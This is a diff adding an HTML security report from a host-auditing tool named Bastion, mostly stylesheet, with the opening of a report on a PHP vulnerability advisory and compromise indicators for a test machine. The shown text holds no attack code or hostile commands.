@@ -1,0 +1,1006 @@
+<!doctype html>
+<html lang="en" data-lang="en" data-initial-lang="auto">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark light">
+<meta name="robots" content="noindex">
+<title>Bastion report · vm</title>
+<style>/*
+ * Bastion design system — shared by the offline HTML report (embedded by
+ * internal/report) and the website (copied by site/build.mjs).
+ * Dark first; light theme via prefers-color-scheme or [data-theme="light"].
+ * No external assets: the report must render offline.
+ */
+:root {
+  color-scheme: dark;
+  --bg: #08090b;
+  --bg-1: #0d0f12;
+  --bg-2: #121519;
+  --bg-3: #181c21;
+  --line: #1c2026;
+  --line-2: #262b33;
+  --line-3: #353b45;
+  --text: #e8eaed;
+  --text-2: #a6acb6;
+  --text-3: #6c727d;
+  --text-4: #4a4f58;
+  --accent: #7cc7ff;
+  --accent-2: #a5d8ff;
+  --accent-bg: rgba(124, 199, 255, 0.08);
+  --accent-line: rgba(124, 199, 255, 0.28);
+  --red: #ff5f5f;
+  --red-bg: rgba(255, 95, 95, 0.09);
+  --red-line: rgba(255, 95, 95, 0.32);
+  --amber: #ffb547;
+  --amber-bg: rgba(255, 181, 71, 0.09);
+  --amber-line: rgba(255, 181, 71, 0.32);
+  --green: #42d392;
+  --green-bg: rgba(66, 211, 146, 0.08);
+  --green-line: rgba(66, 211, 146, 0.3);
+  --blue: #8aa8ff;
+  --blue-bg: rgba(138, 168, 255, 0.09);
+  --gray: #8f96a1;
+  --gray-bg: rgba(143, 150, 161, 0.1);
+  --violet: #b69cff;
+  --code-kw: #ff8fb1;
+  --code-fn: #7cc7ff;
+  --code-str: #a8e6a1;
+  --code-num: #ffc98a;
+  --code-com: #5d6470;
+  --code-type: #c6a8ff;
+  --radius: 10px;
+  --radius-sm: 6px;
+  --shadow: 0 1px 0 rgba(255, 255, 255, 0.03) inset, 0 20px 40px -24px rgba(0, 0, 0, 0.8);
+  --font-sans: "Inter", ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "Noto Sans SC", sans-serif;
+  --font-mono: "JetBrains Mono", ui-monospace, "SFMono-Regular", "SF Mono", Menlo, Consolas, "Liberation Mono", "Noto Sans Mono CJK SC", monospace;
+}
+
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    color-scheme: light;
+    --bg: #fbfbfc;
+    --bg-1: #ffffff;
+    --bg-2: #f4f5f7;
+    --bg-3: #eceef1;
+    --line: #e7e9ed;
+    --line-2: #dcdfe4;
+    --line-3: #c9cdd4;
+    --text: #0d1014;
+    --text-2: #4b525d;
+    --text-3: #7a818c;
+    --text-4: #a3a9b2;
+    --accent: #0a6dc2;
+    --accent-2: #0858a0;
+    --accent-bg: rgba(10, 109, 194, 0.07);
+    --accent-line: rgba(10, 109, 194, 0.28);
+    --red: #d42f2f;
+    --red-bg: rgba(212, 47, 47, 0.07);
+    --red-line: rgba(212, 47, 47, 0.3);
+    --amber: #b86e00;
+    --amber-bg: rgba(184, 110, 0, 0.08);
+    --amber-line: rgba(184, 110, 0, 0.3);
+    --green: #11845b;
+    --green-bg: rgba(17, 132, 91, 0.07);
+    --green-line: rgba(17, 132, 91, 0.3);
+    --blue: #3f5fd8;
+    --blue-bg: rgba(63, 95, 216, 0.07);
+    --gray: #697080;
+    --gray-bg: rgba(105, 112, 128, 0.09);
+    --code-kw: #c2185b;
+    --code-fn: #0a6dc2;
+    --code-str: #2e7d32;
+    --code-num: #b55b00;
+    --code-com: #8a919c;
+    --code-type: #6d3fd1;
+    --shadow: 0 1px 2px rgba(16, 24, 40, 0.04), 0 12px 32px -20px rgba(16, 24, 40, 0.18);
+  }
+}
+
+:root[data-theme="light"] {
+  color-scheme: light;
+  --bg: #fbfbfc;
+  --bg-1: #ffffff;
+  --bg-2: #f4f5f7;
+  --bg-3: #eceef1;
+  --line: #e7e9ed;
+  --line-2: #dcdfe4;
+  --line-3: #c9cdd4;
+  --text: #0d1014;
+  --text-2: #4b525d;
+  --text-3: #7a818c;
+  --text-4: #a3a9b2;
+  --accent: #0a6dc2;
+  --accent-2: #0858a0;
+  --accent-bg: rgba(10, 109, 194, 0.07);
+  --accent-line: rgba(10, 109, 194, 0.28);
+  --red: #d42f2f;
+  --red-bg: rgba(212, 47, 47, 0.07);
+  --red-line: rgba(212, 47, 47, 0.3);
+  --amber: #b86e00;
+  --amber-bg: rgba(184, 110, 0, 0.08);
+  --amber-line: rgba(184, 110, 0, 0.3);
+  --green: #11845b;
+  --green-bg: rgba(17, 132, 91, 0.07);
+  --green-line: rgba(17, 132, 91, 0.3);
+  --blue: #3f5fd8;
+  --blue-bg: rgba(63, 95, 216, 0.07);
+  --gray: #697080;
+  --gray-bg: rgba(105, 112, 128, 0.09);
+  --code-kw: #c2185b;
+  --code-fn: #0a6dc2;
+  --code-str: #2e7d32;
+  --code-num: #b55b00;
+  --code-com: #8a919c;
+  --code-type: #6d3fd1;
+  --shadow: 0 1px 2px rgba(16, 24, 40, 0.04), 0 12px 32px -20px rgba(16, 24, 40, 0.18);
+}
+
+*, *::before, *::after { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; text-size-adjust: 100%; }
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-sans);
+  font-size: 15px;
+  line-height: 1.6;
+  font-feature-settings: "cv11", "ss01", "ss03";
+  -webkit-font-smoothing: antialiased;
+  text-rendering: optimizeLegibility;
+}
+::selection { background: var(--accent-line); }
+a { color: var(--accent); text-decoration: none; }
+a:hover { text-decoration: underline; text-underline-offset: 3px; }
+code, kbd, pre, .mono { font-family: var(--font-mono); font-size: 0.9em; font-variant-ligatures: none; font-feature-settings: "liga" 0, "calt" 0; }
+:not(pre) > code { background: var(--bg-3); border: 1px solid var(--line); padding: 0.08em 0.38em; border-radius: 5px; font-size: 0.86em; color: var(--text); word-break: break-word; }
+h1, h2, h3, h4 { line-height: 1.2; letter-spacing: -0.02em; margin: 0; font-weight: 600; }
+img, svg { max-width: 100%; }
+:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 4px; }
+
+/* Language switching: <span lang="en">…</span><span lang="zh">…</span> */
+html[data-lang="en"] [lang="zh"]:not(html),
+html[data-lang="zh"] [lang="en"]:not(html) { display: none !important; }
+
+/* ---- primitives ------------------------------------------------------- */
+.bx-wrap { width: 100%; max-width: 1160px; margin: 0 auto; padding: 0 24px; }
+.bx-eyebrow { font-family: var(--font-mono); font-size: 11.5px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--text-3); }
+.bx-muted { color: var(--text-2); }
+.bx-faint { color: var(--text-3); }
+.bx-hr { border: 0; border-top: 1px solid var(--line); margin: 0; }
+
+.bx-card {
+  background: var(--bg-1);
+  border: 1px solid var(--line);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+}
+.bx-card-head {
+  display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  padding: 12px 16px; border-bottom: 1px solid var(--line);
+}
+.bx-card-body { padding: 16px; }
+
+.bx-badge {
+  display: inline-flex; align-items: center; gap: 6px;
+  font-family: var(--font-mono); font-size: 11px; font-weight: 600; letter-spacing: 0.06em; text-transform: uppercase;
+  padding: 3px 8px; border-radius: 999px; border: 1px solid var(--line-2);
+  color: var(--text-2); background: var(--bg-2); white-space: nowrap; line-height: 1.4;
+}
+.bx-badge::before { content: ""; width: 6px; height: 6px; border-radius: 50%; background: currentColor; flex: none; }
+.bx-badge.is-plain::before { display: none; }
+.bx-badge.is-red, .bx-badge[data-status="vulnerable"], .bx-badge[data-sev="high"] { color: var(--red); background: var(--red-bg); border-color: var(--red-line); }
+.bx-badge.is-amber, .bx-badge[data-status="likely-vulnerable"], .bx-badge[data-sev="medium"] { color: var(--amber); background: var(--amber-bg); border-color: var(--amber-line); }
+.bx-badge.is-green, .bx-badge[data-status="fixed"] { color: var(--green); background: var(--green-bg); border-color: var(--green-line); }
+.bx-badge.is-gray, .bx-badge[data-status="unknown"], .bx-badge[data-sev="info"] { color: var(--gray); background: var(--gray-bg); border-color: var(--line-2); }
+.bx-badge.is-blue, .bx-badge[data-sev="low"] { color: var(--blue); background: var(--blue-bg); border-color: var(--line-2); }
+.bx-badge.is-accent { color: var(--accent); background: var(--accent-bg); border-color: var(--accent-line); }
+
+.bx-chip {
+  display: inline-flex; align-items: center; gap: 6px; font-family: var(--font-mono); font-size: 12px;
+  color: var(--text-2); background: var(--bg-2); border: 1px solid var(--line); border-radius: 6px; padding: 2px 8px; white-space: nowrap;
+}
+
+.bx-btn {
+  display: inline-flex; align-items: center; gap: 8px; justify-content: center;
+  font: 500 13.5px/1 var(--font-sans); color: var(--text); background: var(--bg-2);
+  border: 1px solid var(--line-2); border-radius: 8px; padding: 9px 14px; cursor: pointer; text-decoration: none !important;
+  transition: background 0.15s, border-color 0.15s;
+}
+.bx-btn:hover { background: var(--bg-3); border-color: var(--line-3); }
+.bx-btn.is-primary { background: var(--text); color: var(--bg); border-color: var(--text); }
+.bx-btn.is-primary:hover { opacity: 0.9; }
+.bx-btn.is-ghost { background: transparent; border-color: transparent; color: var(--text-2); }
+.bx-btn.is-ghost:hover { color: var(--text); background: var(--bg-2); }
+.bx-btn.is-sm { padding: 6px 10px; font-size: 12.5px; }
+
+/* Segmented control (language / theme switches). */
+.bx-seg { display: inline-flex; border: 1px solid var(--line-2); border-radius: 8px; padding: 2px; background: var(--bg-1); }
+.bx-seg button {
+  font: 500 12px/1 var(--font-mono); color: var(--text-3); background: none; border: 0; border-radius: 6px; padding: 6px 9px; cursor: pointer;
+}
+.bx-seg button[aria-pressed="true"] { background: var(--bg-3); color: var(--text); }
+
+/* ---- tables -------------------------------------------------------------- */
+.bx-table-wrap { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+.bx-table { width: 100%; border-collapse: collapse; font-size: 13.5px; }
+.bx-table th {
+  text-align: left; font: 500 11px/1 var(--font-mono); letter-spacing: 0.07em; text-transform: uppercase;
+  color: var(--text-3); padding: 10px 14px; border-bottom: 1px solid var(--line); white-space: nowrap; background: var(--bg-1);
+}
+.bx-table td { padding: 10px 14px; border-bottom: 1px solid var(--line); vertical-align: top; }
+.bx-table tr:last-child td { border-bottom: 0; }
+.bx-table td.mono, .bx-table .mono { font-size: 12.5px; }
+.bx-table tbody tr:hover td { background: var(--bg-2); }
+
+.bx-kv { display: grid; grid-template-columns: max-content 1fr; gap: 6px 18px; font-size: 13.5px; margin: 0; }
+.bx-kv dt { color: var(--text-3); font-family: var(--font-mono); font-size: 12px; padding-top: 1px; }
+.bx-kv dd { margin: 0; min-width: 0; overflow-wrap: anywhere; }
+
+/* ---- code & terminal ---------------------------------------------------- */
+.bx-code {
+  margin: 0; background: var(--bg-1); border: 1px solid var(--line); border-radius: var(--radius-sm);
+  padding: 14px 16px; overflow-x: auto; font: 12.75px/1.65 var(--font-mono); color: var(--text); tab-size: 4;
+}
+.bx-code .k { color: var(--code-kw); }
+.bx-code .f { color: var(--code-fn); }
+.bx-code .s { color: var(--code-str); }
+.bx-code .n { color: var(--code-num); }
+.bx-code .c { color: var(--code-com); font-style: italic; }
+.bx-code .t { color: var(--code-type); }
+.bx-code .hl { background: var(--accent-bg); display: inline-block; width: 100%; }
+
+.bx-term {
+  background: #050607; border: 1px solid var(--line-2); border-radius: var(--radius); overflow: hidden;
+  box-shadow: 0 30px 60px -30px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+  color: #d7dbe0;
+}
+.bx-term-bar { display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid #16191d; background: #0a0c0e; }
+.bx-term-dots { display: flex; gap: 6px; }
+.bx-term-dots i { width: 10px; height: 10px; border-radius: 50%; background: #23272d; display: block; }
+.bx-term-title { font: 12px var(--font-mono); color: #6b727c; margin-left: 6px; }
+.bx-term pre { margin: 0; padding: 16px 18px; overflow-x: auto; font: 12.5px/1.55 var(--font-mono); white-space: pre; }
+/* ANSI 256 colours used by Bastion's terminal UI (internal/ui/style.go). */
+.ansi-1 { font-weight: 700; } .ansi-2 { opacity: 0.65; }
+.fg-203 { color: #ff5f5f; } .fg-214 { color: #ffaf00; } .fg-78 { color: #5fd787; } .fg-111 { color: #87afff; }
+.fg-141 { color: #af87ff; } .fg-245 { color: #8a8a8a; } .fg-240 { color: #585858; } .fg-255 { color: #eeeeee; }
+.fg-117 { color: #87d7ff; } .fg-232 { color: #080808; } .fg-250 { color: #bcbcbc; }
+.bg-203 { background: #ff5f5f; } .bg-214 { background: #ffaf00; } .bg-78 { background: #5fd787; } .bg-250 { background: #bcbcbc; } .bg-117 { background: #87d7ff; }
+
+/* ---- timeline ------------------------------------------------------------ */
+.bx-timeline { list-style: none; margin: 0; padding: 0; font-size: 13px; }
+.bx-timeline .day { font: 600 12px var(--font-mono); color: var(--text-2); padding: 14px 0 6px; }
+.bx-timeline li.ev { display: grid; grid-template-columns: 74px 14px 1fr; gap: 10px; align-items: baseline; padding: 4px 0; position: relative; }
+.bx-timeline li.ev time { font: 12px var(--font-mono); color: var(--text-3); }
+.bx-timeline li.ev .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--line-3); margin-top: 5px; position: relative; }
+.bx-timeline li.ev .dot::after { content: ""; position: absolute; left: 3.5px; top: 10px; width: 1px; height: 18px; background: var(--line-2); }
+.bx-timeline li.ev:last-child .dot::after { display: none; }
+.bx-timeline li.ev[data-sev="high"] .dot { background: var(--red); box-shadow: 0 0 0 3px var(--red-bg); }
+.bx-timeline li.ev[data-sev="medium"] .dot { background: var(--amber); box-shadow: 0 0 0 3px var(--amber-bg); }
+.bx-timeline li.ev[data-sev="low"] .dot { background: var(--blue); }
+.bx-timeline .what { min-width: 0; overflow-wrap: anywhere; }
+.bx-timeline .what .path { font: 12px var(--font-mono); color: var(--text-3); display: block; }
+
+/* ---- grid backdrop ---------------------------------------------------------- */
+.bx-grid-bg {
+  background-image:
+    linear-gradient(to right, var(--line) 1px, transparent 1px),
+    linear-gradient(to bottom, var(--line) 1px, transparent 1px);
+  background-size: 48px 48px;
+  mask-image: radial-gradient(ellipse at 50% 0%, #000 0%, transparent 70%);
+  -webkit-mask-image: radial-gradient(ellipse at 50% 0%, #000 0%, transparent 70%);
+}
+
+.bx-logo { display: inline-flex; align-items: center; gap: 10px; font-weight: 650; letter-spacing: -0.01em; color: var(--text); }
+.bx-logo svg { width: 22px; height: 22px; }
+
+@media (max-width: 640px) {
+  body { font-size: 14.5px; }
+  .bx-wrap { padding: 0 16px; }
+  .bx-table th, .bx-table td { padding: 9px 10px; }
+  .bx-term pre { font-size: 11px; padding: 12px; }
+  .bx-timeline li.ev { grid-template-columns: 62px 12px 1fr; gap: 8px; }
+}
+
+@media print {
+  :root { color-scheme: light; }
+  body { background: #fff; color: #000; }
+  .no-print { display: none !important; }
+  .bx-card { box-shadow: none; break-inside: avoid; }
+}
+
+/* Report-specific layout on top of design/bastion.css */
+.r-top { position: sticky; top: 0; z-index: 10; background: color-mix(in srgb, var(--bg) 82%, transparent); backdrop-filter: saturate(140%) blur(10px); -webkit-backdrop-filter: saturate(140%) blur(10px); border-bottom: 1px solid var(--line); }
+.r-top-in { display: flex; align-items: center; justify-content: space-between; gap: 12px; height: 56px; }
+.r-top-actions { display: flex; align-items: center; gap: 8px; }
+.r-sub { font-weight: 400; font-size: 13px; }
+.r-main { padding-top: 36px; padding-bottom: 64px; }
+.r-hero { margin-bottom: 28px; }
+.r-host { font-size: clamp(24px, 4vw, 36px); font-weight: 600; letter-spacing: -0.03em; margin: 6px 0 14px; overflow-wrap: anywhere; }
+.r-meta { font-size: 13px; }
+
+.r-verdicts { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin-bottom: 44px; }
+.r-verdict { display: flex; flex-direction: column; gap: 14px; padding: 18px 20px; color: inherit; text-decoration: none !important; position: relative; overflow: hidden; transition: border-color 0.15s; }
+.r-verdict:hover { border-color: var(--line-3); }
+.r-verdict::before { content: ""; position: absolute; inset: 0 0 auto 0; height: 2px; background: var(--line-2); }
+.r-verdict[data-tone="vulnerable"]::before, .r-verdict[data-tone="compromised"]::before { background: var(--red); }
+.r-verdict[data-tone="likely-vulnerable"]::before, .r-verdict[data-tone="suspicious"]::before { background: var(--amber); }
+.r-verdict[data-tone="fixed"]::before, .r-verdict[data-tone="no-indicators"]::before { background: var(--green); }
+.r-verdict-main .bx-badge { font-size: 13px; padding: 6px 12px; }
+.r-verdict-note { margin: 0; font-size: 13.5px; }
+.bx-badge[data-verdict="compromised"] { color: var(--red); background: var(--red-bg); border-color: var(--red-line); }
+.bx-badge[data-verdict="suspicious"] { color: var(--amber); background: var(--amber-bg); border-color: var(--amber-line); }
+.bx-badge[data-verdict="no-indicators"] { color: var(--green); background: var(--green-bg); border-color: var(--green-line); }
+
+.r-bar { display: flex; height: 6px; border-radius: 99px; overflow: hidden; background: var(--bg-3); }
+.r-bar i { display: block; width: var(--w); }
+[data-status="vulnerable"] > b, .r-bar i[data-status="vulnerable"] { background: var(--red); }
+.r-bar i[data-status="likely-vulnerable"] { background: var(--amber); }
+.r-bar i[data-status="unknown"] { background: var(--gray); }
+.r-bar i[data-status="fixed"] { background: var(--green); }
+.r-legend { list-style: none; padding: 0; margin: 10px 0 0; display: flex; flex-wrap: wrap; gap: 6px 16px; font-size: 12px; color: var(--text-2); }
+.r-legend b { font-weight: 600; color: var(--text); background: none; }
+.r-legend li::before { content: ""; display: inline-block; width: 7px; height: 7px; border-radius: 2px; margin-right: 7px; background: var(--gray); vertical-align: 1px; }
+.r-legend li[data-status="vulnerable"]::before, .r-legend li[data-sev="high"]::before { background: var(--red); }
+.r-legend li[data-status="likely-vulnerable"]::before, .r-legend li[data-sev="medium"]::before { background: var(--amber); }
+.r-legend li[data-status="fixed"]::before { background: var(--green); }
+.r-legend li[data-sev="low"]::before { background: var(--blue); }
+.r-legend-sev { margin-top: 0; }
+
+.r-section { margin: 0 0 18px; scroll-margin-top: 72px; }
+.r-section + .bx-card, .r-section .bx-card + .bx-card { margin-top: 14px; }
+.r-section-head { display: flex; align-items: baseline; justify-content: space-between; gap: 12px; flex-wrap: wrap; margin-bottom: 14px; }
+.r-section-head h2 { font-size: 19px; }
+.r-filters { display: flex; gap: 6px; }
+.r-filters .bx-chip { cursor: pointer; }
+.r-filters .bx-chip[aria-pressed="true"] { color: var(--text); border-color: var(--line-3); background: var(--bg-3); }
+
+.r-adv { padding: 16px 18px; }
+.r-adv-head { display: flex; align-items: center; flex-wrap: wrap; gap: 8px; }
+.r-adv-name { font-size: 15px; margin-right: 4px; }
+.r-adv-date { margin-left: auto; font-size: 12px; }
+.r-adv-summary { color: var(--text-2); font-size: 13.5px; margin: 10px 0 14px; max-width: 900px; }
+.r-fixed-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 1px; background: var(--line); border: 1px solid var(--line); border-radius: var(--radius-sm); overflow: hidden; }
+.r-fixed { background: var(--bg-1); padding: 8px 12px; display: flex; flex-direction: column; gap: 2px; font-size: 12.5px; }
+.r-ok { color: var(--green); }
+.r-bad { color: var(--red); }
+
+.r-instances { margin: 14px 0 44px; overflow: hidden; }
+.r-inst { border-bottom: 1px solid var(--line); }
+.r-inst:last-child { border-bottom: 0; }
+.r-inst summary { list-style: none; cursor: pointer; display: grid; grid-template-columns: 178px minmax(0, 1.6fr) minmax(0, 1.2fr) minmax(0, 1fr); gap: 14px; align-items: center; padding: 12px 16px; }
+.r-inst summary::-webkit-details-marker { display: none; }
+.r-inst summary:hover { background: var(--bg-2); }
+.r-inst[open] summary { background: var(--bg-2); border-bottom: 1px solid var(--line); }
+.r-inst-path { font-size: 13px; overflow-wrap: anywhere; }
+.r-inst-meta { font-size: 12px; color: var(--text-2); }
+.r-inst-meta b { color: var(--text); font-weight: 600; }
+.r-inst-env { font-size: 13px; color: var(--text-2); }
+.r-stale { font-style: normal; color: var(--amber); border: 1px solid var(--amber-line); border-radius: 4px; padding: 0 5px; font-size: 11px; }
+.r-inst-body { padding: 16px 18px 18px; display: grid; gap: 14px; }
+.r-note { margin: 0; color: var(--amber); font-size: 13px; }
+.r-assess { border: 1px solid var(--line); border-radius: var(--radius-sm); background: var(--bg); }
+.r-assess-head { padding: 10px 14px; border-bottom: 1px solid var(--line); font-size: 13.5px; }
+.r-evidence { list-style: none; margin: 0; padding: 8px 14px; font-size: 13px; }
+.r-evidence li { display: grid; grid-template-columns: 14px 88px 1fr; gap: 8px; padding: 4px 0; align-items: baseline; }
+.r-ev-mark::before { content: "·"; color: var(--text-3); font-weight: 700; }
+.r-evidence li[data-verdict="fixed"] .r-ev-mark::before { content: "✓"; color: var(--green); }
+.r-evidence li[data-verdict="vulnerable"] .r-ev-mark::before { content: "✗"; color: var(--red); }
+.r-ev-kind { color: var(--text-3); font-size: 12px; }
+.r-ev-detail { overflow-wrap: anywhere; }
+.r-steps { border-top: 1px solid var(--line); padding: 10px 14px 12px; }
+.r-steps ol { margin: 6px 0 0; padding-left: 20px; font-size: 13px; }
+.r-steps li { margin: 3px 0; font-family: var(--font-mono); font-size: 12.5px; color: var(--accent); overflow-wrap: anywhere; }
+
+.r-warnings { margin: -28px 0 40px; font-size: 13px; color: var(--amber); }
+.r-warnings p { margin: 4px 0; }
+
+.r-trace-grid { display: grid; grid-template-columns: minmax(0, 1.65fr) minmax(0, 1fr); gap: 16px; align-items: start; }
+.r-findings { display: grid; gap: 12px; }
+.r-finding { padding: 14px 16px; border-left: 2px solid var(--line-3); }
+.r-finding[data-sev="high"] { border-left-color: var(--red); }
+.r-finding[data-sev="medium"] { border-left-color: var(--amber); }
+.r-finding[data-sev="low"] { border-left-color: var(--blue); }
+.r-finding header { display: flex; align-items: center; flex-wrap: wrap; gap: 8px 10px; }
+.r-finding h3 { font-size: 14.5px; font-weight: 600; letter-spacing: -0.01em; }
+.r-rule { margin-left: auto; font-size: 11.5px; }
+.r-loc { font-size: 12.5px; color: var(--accent); margin: 8px 0; overflow-wrap: anywhere; }
+.r-snippet { font-size: 12px; white-space: pre-wrap; word-break: break-all; margin: 8px 0; }
+.r-why { margin: 6px 0 0; font-size: 13px; }
+.r-details { list-style: none; padding: 0; margin: 8px 0 0; font-size: 11.5px; color: var(--text-3); }
+.r-details li { overflow-wrap: anywhere; padding: 1px 0; }
+.r-tl { position: sticky; top: 72px; max-height: calc(100vh - 90px); overflow: auto; }
+.r-scope { margin-top: 16px; }
+.r-method { margin-top: 44px; font-size: 13.5px; color: var(--text-2); }
+.r-method p { margin: 8px 0 0; max-width: 920px; }
+.r-foot { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 8px; padding-bottom: 40px; font-size: 11.5px; }
+
+@media (max-width: 900px) {
+  .r-trace-grid { grid-template-columns: 1fr; }
+  .r-tl { position: static; max-height: none; }
+  .r-inst summary { grid-template-columns: auto 1fr; gap: 6px 12px; }
+  .r-inst-path { grid-column: 1 / -1; order: 2; }
+  .r-inst-meta { grid-column: 1 / -1; order: 3; }
+  .r-inst-env { order: 1; text-align: right; font-size: 12px; }
+}
+@media (max-width: 640px) {
+  .r-top-actions .bx-btn { display: none; }
+  .r-adv-date { margin-left: 0; width: 100%; }
+  .r-rule { margin-left: 0; width: 100%; }
+  .r-evidence li { grid-template-columns: 14px 1fr; }
+  .r-ev-kind { display: none; }
+}
+@media print {
+  .r-top { position: static; }
+  .r-inst { break-inside: avoid; }
+  .r-inst-body { display: grid !important; }
+  .r-tl { position: static; max-height: none; }
+}
+</style>
+</head>
+<body>
+<header class="r-top no-print-bg">
+  <div class="bx-wrap r-top-in">
+    <span class="bx-logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M4 3h3v2h3V3h4v2h3V3h3v6l-2 1.5V21H6V10.5L4 9V3Z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M10 21v-5a2 2 0 1 1 4 0v5" stroke="currentColor" stroke-width="1.6"/><path d="M6 10.5h12" stroke="currentColor" stroke-width="1.6" opacity=".5"/></svg>
+ Bastion <span class="bx-faint r-sub"><span lang="en">report</span><span lang="zh">安全报告</span></span></span>
+    <div class="r-top-actions no-print">
+      <div class="bx-seg" role="group" aria-label="Language"><button type="button" data-set-lang="en" aria-pressed="true">EN</button><button type="button" data-set-lang="zh" aria-pressed="false">中文</button></div>
+      <div class="bx-seg" role="group" aria-label="Theme"><button type="button" data-set-theme="dark" aria-pressed="false" title="Dark">◐</button><button type="button" data-set-theme="light" aria-pressed="false" title="Light">○</button></div>
+      <button type="button" class="bx-btn is-sm" data-print><span lang="en">Print / PDF</span><span lang="zh">打印 / PDF</span></button>
+    </div>
+  </div>
+</header>
+
+<main class="bx-wrap r-main">
+  <section class="r-hero">
+    <div class="bx-eyebrow"><span lang="en">Local security report</span><span lang="zh">本机安全报告</span></div>
+    <h1 class="r-host mono">vm</h1>
+    <dl class="bx-kv r-meta">
+      <dt>os</dt><dd>Ubuntu 24.04.5 LTS <span class="bx-faint">· kernel 6.18.44-fc-v140</span></dd>
+      <dt><span lang="en">generated</span><span lang="zh">生成时间</span></dt><dd class="mono">2026-10-22 07:12 UTC · bastion dev</dd>
+      <dt><span lang="en">privileges</span><span lang="zh">权限</span></dt><dd>root</dd>
+    </dl>
+  </section>
+
+  <section class="r-verdicts">
+    
+    <a class="bx-card r-verdict" data-tone="vulnerable" href="#exposure">
+      <div class="bx-eyebrow"><span lang="en">01 · Vulnerability exposure</span><span lang="zh">01 · 漏洞暴露面</span></div>
+      <div class="r-verdict-main"><span class="bx-badge" data-status="vulnerable"><span lang="en">Vulnerable</span><span lang="zh">存在漏洞</span></span></div>
+      <div class="r-bars">
+        
+        <div class="r-bar" aria-hidden="true">
+          <i style="--w:37%" data-status="vulnerable"></i><i style="--w:0%" data-status="likely-vulnerable"></i><i style="--w:0%" data-status="unknown"></i><i style="--w:62%" data-status="fixed"></i>
+        </div>
+        <ul class="r-legend mono">
+          <li data-status="vulnerable"><b>3</b> <span lang="en">vulnerable</span><span lang="zh">存在漏洞</span></li>
+          <li data-status="likely-vulnerable"><b>0</b> <span lang="en">likely</span><span lang="zh">很可能</span></li>
+          <li data-status="unknown"><b>0</b> <span lang="en">unknown</span><span lang="zh">无法判断</span></li>
+          <li data-status="fixed"><b>5</b> <span lang="en">fixed</span><span lang="zh">已修复</span></li>
+        </ul>
+      </div>
+      <p class="bx-muted r-verdict-note">8 <span lang="en">PHP builds across</span><span lang="zh">个 PHP 构建，分布在</span> 4 <span lang="en">targets (host, containers, namespaces).</span><span lang="zh">个目标中（主机、容器、命名空间）。</span></p>
+    </a>
+    
+    
+    <a class="bx-card r-verdict" data-tone="compromised" href="#trace">
+      <div class="bx-eyebrow"><span lang="en">02 · Intrusion trace</span><span lang="zh">02 · 入侵溯源</span></div>
+      <div class="r-verdict-main"><span class="bx-badge" data-verdict="compromised"><span lang="en">Compromise indicators found</span><span lang="zh">发现入侵迹象</span></span></div>
+      <ul class="r-legend mono r-legend-sev">
+        <li data-sev="high"><b>6</b> high</li>
+        <li data-sev="medium"><b>4</b> medium</li>
+        <li data-sev="low"><b>0</b> low</li>
+        <li data-sev="info"><b>0</b> info</li>
+      </ul>
+      <p class="bx-muted r-verdict-note"><span lang="en">Strong indicators of compromise. Treat the server as breached: preserve evidence (copy files and logs before changing anything), rotate credentials, and rebuild from a known-good source.</span><span lang="zh">存在明显的入侵迹象。请按已被入侵处理：先保全证据（在改动任何东西之前复制文件和日志），轮换所有凭据，并从可信来源重建。</span></p>
+    </a>
+    
+  </section>
+
+  
+  <section class="r-section" id="exposure">
+    <div class="r-section-head">
+      <h2><span lang="en">Vulnerability exposure</span><span lang="zh">漏洞暴露面</span></h2>
+      <div class="r-filters no-print" role="group" aria-label="Filter">
+        <button type="button" class="bx-chip" data-filter="all" aria-pressed="true"><span lang="en">all</span><span lang="zh">全部</span></button>
+        <button type="button" class="bx-chip" data-filter="attention" aria-pressed="false"><span lang="en">needs action</span><span lang="zh">需处理</span></button>
+        <button type="button" class="bx-chip" data-filter="fixed" aria-pressed="false"><span lang="en">fixed</span><span lang="zh">已修复</span></button>
+      </div>
+    </div>
+
+    
+    <div class="bx-card r-adv">
+      <div class="r-adv-head">
+        <span class="bx-badge is-red is-plain">critical</span>
+        <strong class="r-adv-name">PHP2Shell</strong>
+        <a class="bx-chip" href="https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w" rel="noreferrer">CVE-2026-109618</a><a class="bx-chip" href="https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp" rel="noreferrer">CVE-2026-109619</a>
+        <span class="bx-chip">CVSS 4.0 · 9.2</span>
+        <span class="bx-faint mono r-adv-date"><span lang="en">published</span><span lang="zh">发布于</span> 2026-10-21</span>
+      </div>
+      <p class="r-adv-summary"><span lang="en">Two memory-safety flaws in the PHP engine let an unauthenticated HTTP request corrupt request state (through out-of-memory bailouts) or reuse freed global state in a later request on the same worker, leading to remote code execution as the web worker account. Apache mod_php is confirmed exploitable; PHP-FPM, FrankenPHP and LiteSpeed are considered likely susceptible.</span><span lang="zh">PHP 引擎中的两个内存安全缺陷：未授权的 HTTP 请求可以借助内存耗尽时的异常退出破坏请求状态，或让同一工作进程的后续请求复用已释放的全局状态，最终以 Web 进程账号的权限执行任意代码。Apache mod_php 已被证实可利用，PHP-FPM、FrankenPHP 和 LiteSpeed 被认为同样可能受影响。</span></p>
+      <div class="r-fixed-grid">
